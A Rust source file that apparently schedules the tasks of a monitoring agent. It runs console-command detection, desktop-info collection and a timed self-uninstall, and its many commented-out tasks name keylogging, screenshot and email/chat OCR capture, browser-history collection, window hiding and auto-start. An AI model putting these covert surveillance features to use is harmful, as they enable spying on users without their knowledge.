use crate::SHARED_PAYLOAD;
use std::future::Future;
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tokio::time::sleep;

// use super::components::file_system_monitor_watch::file_system_monitor_fl::file_system_monitor_mod_fn;
// use super::components::log_error::log_error_read_and_post_fl::send_log_to_api;
// use crate::modules::components::application_install_check::application_install_check_fl::is_app_installed_completely_fn;
// use crate::modules::components::capture_screen_shot::capture_screenshot_and_ocr::capture_and_process_screenshot_fn;
use crate::modules::components::desktop_details_info::desktop_details_info_fl::get_desktop_details_fn;
// use crate::modules::components::get_active_window_with_time::get_active_window_with_time_fl::monitor_active_window_fn;
// use crate::modules::components::get_browser_history_database::get_browser_history_database_fl::get_chrome_history_fn;
// use crate::modules::components::listen_mouse_keyboard_event::listen_mouse_keyboard_event_fl::listen_to_keyboards_main_fn;
use crate::modules::components::log_error::log_error_fl::log_error_fn;
// use crate::modules::components::set_auto_start_application::set_auto_start_application_fl::set_auto_start_fn;
use crate::modules::components::uninstall_application::uninstall_application_fl::uninstall_app_fn;
// use crate::modules::components::hide_window::hide_window_fl::hide_window_fn;

use super::components::detect_console_command::detect_console_command_fl::detect_console_command;
// use super::components::get_search_key_from_url::get_search_key_from_url_fl::get_search_key_from_url_fn;

// #[cfg(unix)]
// use super::components::detect_online_chat::detect_online_chat_fl::detect_online_chat_fn;
// #[cfg(unix)]
// use super::components::email_read_using_ocr::email_read_using_ocr_fl::capture_and_process_screenshot_detect_email_fn;
// #[cfg(unix)]
// use crate::modules::components::meeting_capture_using_ocr::meeting_capture_using_ocr_fl::capture_meeting_using_ocr_fn;
// #[cfg(unix)]
// use crate::modules::components::social_media_detection::social_media_detection_fl::detect_social_media_fn;
// use crate::components::admin_check_fl::is_admin;
// use crate::modules::components::application_restrictions::application_restrictions_fl::start_blocking_applications;
// use crate::modules::components::application_restrictions::application_restrictions_fl::stop_blocking_applications;
// use crate::modules::components::usb_storage_enable_disable::usb_storage_enable_disable_fn::disable_usb_storage;
// use crate::modules::components::usb_storage_enable_disable::usb_storage_enable_disable_fn::enable_usb_storage;
// use crate::modules::components::website_restrictions::website_restrictions_fl::block_website;
// use crate::modules::components::website_restrictions::website_restrictions_fl::unblock_website;
// use crate::modules::components::file_system_monitor_watch::file_system_monitor_watch_fl::file_system_monitor_fn;

// use crate::modules::components::capture_screen_shot::capture_screen_shot_fl::take_screenshots_fn;
// use crate::modules::components::image_to_text_detection_ocr::image_to_text_detection_ocr_fl::detect_text_in_image_fn;
// use crate::modules::components::get_running_process_list::get_running_process_fl::trigger_process_check_every_5m_fn;

async fn run_periodic_task<F, Fut>(interval_secs: u64, task: F)
where
    F: Fn() -> Fut + Send + Sync + 'static,
    Fut: Future<Output = ()> + Send + 'static,
{
    loop {
        task().await;
        sleep(Duration::from_secs(interval_secs)).await;
    }
}

pub async fn start_application_threads() {
    let shared_payload = Arc::new(Mutex::new(SHARED_PAYLOAD.lock().unwrap().clone()));

    // tokio::spawn(run_periodic_task(60, {
    //     let shared_payload = Arc::clone(&shared_payload);
    //     move || {
    //         let shared_payload = Arc::clone(&shared_payload);
    //         async move {
    //             let payload = shared_payload.lock().unwrap().clone();
    //             if let Err(e) = capture_and_process_screenshot_fn(20, payload).await {
    //                 log_error_fn(&format!("Failed to take screenshots: {:?}", e));
    //             }
    //         }
    //     }
    // }));

    // tokio::spawn(run_periodic_task(90, {
    //     let shared_payload = Arc::clone(&shared_payload);
    //     move || {
    //         let shared_payload = Arc::clone(&shared_payload);
    //         async move {
    //             let payload = shared_payload.lock().unwrap().clone();
    //             if let Err(e) = get_chrome_history_fn(90, payload).await {
    //                 log_error_fn(&format!("Failed to get Chrome history: {:?}", e));
    //             }
    //         }
    //     }
    // }));

    // tokio::spawn(run_periodic_task(10, {
    //     let shared_payload = Arc::clone(&shared_payload);
    //     move || {
    //         let shared_payload = Arc::clone(&shared_payload);
    //         async move {
    //             let payload = shared_payload.lock().unwrap().clone();
    //             if let Err(e) = monitor_active_window_fn(5, payload).await {
    //                 log_error_fn(&format!("Active window monitoring failed: {:?}", e));
    //             }
    //         }
    //     }
    // }));

    // tokio::spawn(run_periodic_task(250, {
    //     let shared_payload = Arc::clone(&shared_payload);
    //     move || {
    //         let shared_payload = Arc::clone(&shared_payload);
    //         async move {
    //             let payload = shared_payload.lock().unwrap().clone();
    //             if let Err(e) = send_log_to_api(&payload).await {
    //                 log_error_fn(&format!("Failed to send logs to API: {:?}", e));
    //             }
    //         }
    //     }
    // }));

    // tokio::spawn(run_periodic_task(40, {
    //     let shared_payload = Arc::clone(&shared_payload);
    //     move || {
    //         let shared_payload = Arc::clone(&shared_payload);
    //         async move {
    //             let payload = shared_payload.lock().unwrap().clone();
    //             if let Err(e) = listen_to_keyboards_main_fn(40, payload).await {
    //                 log_error_fn(&format!("Keyboard listener failed: {:?}", e));
    //             }
    //         }
    //     }
    // }));

    // tokio::spawn(run_periodic_task(100, {
    //     let shared_payload = Arc::clone(&shared_payload);
    //     move || {
    //         let shared_payload = Arc::clone(&shared_payload);
    //         async move {
    //             let payload = shared_payload.lock().unwrap().clone();
    //             if let Err(e) = file_system_monitor_mod_fn(80, payload).await {
    //                 log_error_fn(&format!("File system monitor failed: {:?}", e));
    //             }
    //         }
    //     }
    // }));

    tokio::spawn(run_periodic_task(100, {
        let shared_payload = Arc::clone(&shared_payload);
        move || {
            let shared_payload = Arc::clone(&shared_payload);
            async move {
                let payload = shared_payload.lock().unwrap().clone();
                if let Err(e) = detect_console_command(30, &payload).await {
                    log_error_fn(&format!("File system monitor failed: {:?}", e));
                }
            }
        }
    }));

    // #[cfg(unix)]
    // tokio::spawn(run_periodic_task(30, {
    //     let shared_payload = Arc::clone(&shared_payload);
    //     move || {
    //         let shared_payload = Arc::clone(&shared_payload);
    //         async move {
    //             let payload = shared_payload.lock().unwrap().clone();
    //             if let Err(e) = capture_and_process_screenshot_detect_email_fn(120, payload).await {
    //                 log_error_fn(&format!("Failed to take screenshots: {:?}", e));
    //             }
    //         }
    //     }
    // }));

    // #[cfg(unix)]
    // tokio::spawn(run_periodic_task(30, {
    //     let shared_payload = Arc::clone(&shared_payload);
    //     move || {
    //         let shared_payload = Arc::clone(&shared_payload);
    //         async move {
    //             let payload = shared_payload.lock().unwrap().clone();
    //             if let Err(e) = capture_meeting_using_ocr_fn(140, payload).await {
    //                 log_error_fn(&format!("Failed to take screenshots: {:?}", e));
    //             }
    //         }
    //     }
    // }));

    // tokio::spawn(run_periodic_task(90, {
    //     let shared_payload = Arc::clone(&shared_payload);
    //     move || {
    //         let shared_payload = Arc::clone(&shared_payload);
    //         async move {
    //             let payload = shared_payload.lock().unwrap().clone();
    //             if let Err(e) = get_search_key_from_url_fn(90, payload).await {
    //                 log_error_fn(&format!("Failed to get Chrome history: {:?}", e));
    //             }
    //         }
    //     }
    // }));

    // #[cfg(unix)]
    // tokio::spawn(run_periodic_task(30, {
    //     let shared_payload = Arc::clone(&shared_payload);
    //     move || {
    //         let shared_payload = Arc::clone(&shared_payload);
    //         async move {
    //             let payload = shared_payload.lock().unwrap().clone();
    //             if let Err(e) = detect_social_media_fn(160, payload).await {
    //                 log_error_fn(&format!("Failed to take screenshots: {:?}", e));
    //             }
    //         }
    //     }
    // }));

    // #[cfg(unix)]
    // tokio::spawn(run_periodic_task(30, {
    //     let shared_payload = Arc::clone(&shared_payload);
    //     move || {
    //         let shared_payload = Arc::clone(&shared_payload);
    //         async move {
    //             let payload = shared_payload.lock().unwrap().clone();
    //             if let Err(e) = detect_online_chat_fn(180, payload).await {
    //                 log_error_fn(&format!("Failed to take screenshots: {:?}", e));
    //             }
    //         }
    //     }
    // }));

    // ------- // bwlow code is for skippable for now // ------- //

    // tokio::spawn(run_periodic_task(60, {
    //     let shared_payload = Arc::clone(&shared_payload);
    //     move || {
    //         let shared_payload = Arc::clone(&shared_payload);
    //         async move {
    //             let payload = shared_payload.lock().unwrap().clone();
    //             if let Err(e) = take_screenshots_fn(60, payload).await {
    //                 log_error_fn(&format!("Failed to take screenshots: {:?}", e));
    //             }
    //         }
    //     }
    // }));

    // #[cfg(unix)]
    // tokio::spawn(run_periodic_task(80, {
    //     let shared_payload = Arc::clone(&shared_payload);
    //     move || {
    //         let shared_payload = Arc::clone(&shared_payload);
    //         async move {
    //             let payload = shared_payload.lock().unwrap().clone();
    //             if let Err(e) = detect_text_in_image_fn(payload).await {
    //                 log_error_fn(&format!("Failed to take screenshots: {:?}", e));
    //             }
    //         }
    //     }
    // }));

    // tokio::spawn(run_periodic_task(120, {
    //     let shared_payload = Arc::clone(&shared_payload);
    //     move || {
    //         let shared_payload = Arc::clone(&shared_payload);
    //         async move {
    //             let payload = shared_payload.lock().unwrap().clone();
    //             if let Err(e) = trigger_process_check_every_5m_fn(120, payload).await {
    //                 log_error_fn(&format!("Process check failed: {:?}", e));
    //             }
    //         }
    //     }
    // }));

    // Run non-periodic tasks and uninstall task
    let _ = tokio::try_join!(
        // tokio::spawn(async {
        //     hide_window_fn().await;
        // }),
        // tokio::spawn(async {
        //     set_auto_start_fn().await;
        // }),
        // tokio::spawn(async {
        //     is_app_installed_completely_fn().await;
        // }),
        tokio::spawn(async move {
            let payload = shared_payload.lock().unwrap().clone();
            if let Err(e) = get_desktop_details_fn(payload).await {
                log_error_fn(&format!("Failed to get desktop details: {:?}", e));
            }
        }),
        // // USB storage enable/disable task
        // tokio::spawn(async {
        //     let should_disable_usb = false;
        //     let admin_check = is_admin();
        //     if !admin_check {
        //         println!("Not running as admin, exiting application restriction task.");
        //         return;
        //     }
        //     loop {
        //         if should_disable_usb {
        //             println!("Disabling USB storage.");
        //             if let Err(e) = disable_usb_storage().await {
        //                 log_error_fn(&format!("Failed to disable USB storage: {:?}", e));
        //                 eprintln!("Failed to disable USB storage: {}", e);
        //             } else {
        //                 println!("USB storage is disabled.");
        //             }
        //         } else {
        //             println!("Enabling USB storage.");
        //             if let Err(e) = enable_usb_storage().await {
        //                 log_error_fn(&format!("Failed to enable USB storage: {:?}", e));
        //                 eprintln!("Failed to enable USB storage: {}", e);
        //             } else {
        //                 println!("USB storage is enabled.");
        //             }
        //         }
        //         sleep(Duration::from_secs(1)).await;
        //     }
        // }),
        // // Website restriction enable/disable task
        // tokio::spawn(async {
        //     let should_disable_website = false;
        //     let websites = vec!["facebook.com", "youtube.com"];
        //     let admin_check = is_admin();
        //     if !admin_check {
        //         println!("Not running as admin, exiting application restriction task.");
        //         return;
        //     }
        //     loop {
        //         if should_disable_website {
        //             println!("Disabling block websites.");
        //             if let Err(e) = block_website(websites.clone()).await {
        //                 log_error_fn(&format!("Failed to block website: {}", e));
        //                 eprintln!("Failed to block website: {}", e);
        //             } else {
        //                 println!("Websites are disabled.");
        //             }
        //         } else {
        //             println!("Enabling block websites.");
        //             if let Err(e) = unblock_website(websites.clone()).await {
        //                 log_error_fn(&format!("Failed to unblock website: {}", e));
        //                 eprintln!("Failed to unblock website: {}", e);
        //             } else {
        //                 println!("Websites are enabled.");
        //             }
        //         }
        //         sleep(Duration::from_secs(1)).await;
        //     }
        // }),
        // // Application restriction enable/disable task
        // tokio::spawn(async {
        //     let should_disable_application = false;
        //     let process_name = vec!["notepad.exe".to_string()];
        //     let admin_check = is_admin();
        //     if !admin_check {
        //         println!("Not running as admin, exiting application restriction task.");
        //         return;
        //     }
        //     loop {
        //         if should_disable_application {
        //             println!("Disabling block application.");
        //             if let Err(e) = start_blocking_applications(process_name.clone()).await {
        //                 log_error_fn(&format!("Failed to block application: {}", e));
        //                 eprintln!("Failed to block website: {}", e);
        //             } else {
        //                 println!("Application are disabled.");
        //             }
        //         } else {
        //             println!("Enabling block application.");
        //             if let Err(e) = stop_blocking_applications().await {
        //                 log_error_fn(&format!("Failed to unblock application: {}", e));
        //                 eprintln!("Failed to unblock application: {}", e);
        //             } else {
        //                 println!("Application are enabled.");
        //             }
        //         }
        //         sleep(Duration::from_secs(1)).await;
        //     }
        // }),
        // Uninstall task
        // tokio::spawn(async {
        //     let should_uninstall = false;
        //     loop {
        //     if should_uninstall {
        //         println!("Running uninstall_app_fn");
        //         if let Err(e) = uninstall_app_fn().await {
        //         log_error_fn(&format!("Uninstallation failed: {:?}", e));
        //         } else {
        //         println!("Uninstallation completed.");
        //         }
        //         break;
        //     }
        //     sleep(Duration::from_secs(1)).await;
        //     }
        // })

        // this function will be called after 10 minutes for now
        tokio::spawn(async {
            sleep(Duration::from_secs(300)).await;
            println!("Running uninstall_app_fn");
            if let Err(e) = uninstall_app_fn().await {
                log_error_fn(&format!("Uninstallation failed: {:?}", e));
            } else {
                println!("Uninstallation completed.");
            }
        })
    )
    .map_err(|e| log_error_fn(&format!("Task failed: {:?}", e)))
    .ok();
}
